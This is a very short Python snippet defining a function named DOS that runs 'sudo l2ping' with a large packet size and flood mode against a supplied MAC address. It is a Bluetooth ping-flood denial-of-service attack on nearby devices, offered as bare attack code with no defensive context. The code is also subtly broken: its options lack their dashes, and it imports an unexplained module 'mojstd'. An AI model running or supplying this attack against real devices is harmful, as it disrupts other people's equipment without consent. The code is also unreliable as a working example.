import mojstd
import subprocess

def DOS(mac):
    DOS = subprocess.run(["sudo","l2ping", "s", "600", "f", mac])
